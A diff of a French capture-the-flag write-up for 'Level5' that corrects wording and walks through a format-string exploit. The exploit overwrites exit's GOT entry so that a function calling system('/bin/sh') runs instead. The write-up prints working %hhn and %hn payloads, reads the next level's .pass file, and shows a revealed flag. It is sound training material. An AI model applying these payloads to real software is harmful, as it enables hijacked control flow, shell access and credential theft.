@@ -1,16 +1,16 @@
 # Level5
 
-On observe un executable a la racine `level5`
+On observe un exécutable à la racine : `level5`
 
-```bash
+```shell
 $ ./level5
 Hello World
 Hello World
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level5 -q
 Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -53,34 +53,35 @@ End of assembler dump.
 
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level5`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level5`
 
-```bash
+```shell
 $ scp -P 4242 -r level5@192.168.56.102:/home/user/level5/level5 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level5
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
-Notre objectif ici est de modifier la valeur a l'adresse `0x08049838` d'exit sur `got` par l'adresse de la fonction `o`.
-Actuellement `o` n'est pas appeler
+La fonction `o` fait un call `system` à `/bin/sh` mais n'est actuellement pas appelée.
+Notre objectif ici est de remplacer l'adresse d'`exit` sur la `GOT` par celle de `o`. L'adresse d'`exit` est stockée à l'adresse `0x08049838` et est actuellement `0x080483d6`.
 
-On cherche donc a passer de `0x08049838 => 0x080484a4`. Il n'y a que les 2 derniers octects a modifier
+On cherche donc a passer de `0x080483d6 => 0x080484a4`. Il n'y a que les 2 derniers octects à modifier.
 
 A l'adresse `\x39\x98\x04\x08`, nous allons enregistrer <code>84<sub>16</sub>=132<sub>10</sub></code>
 Et a l'adresse `\x38\x98\x04\x08`, nous allons enregistrer <code>a4<sub>16</sub>=164<sub>10</sub></code>
 
-```bash
+```shell
 $ (python -c 'print "\x39\x98\x04\x08\x38\x98\x04\x08%124d%4$hhn%32d%5$hhn"'; cat) | ./level5
 98
                                             512                     -1208149312
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 Ctrl+D
+```
 
-level5:$ su level6
-Password:
+Il est aussi possible de modifier les deux octets en même temps :
 
-level6:$
+```shell
+(python -c 'print "\x38\x98\x04\x08" + "%33952d" + "%4$hn"'; cat) | ./level5
 ```
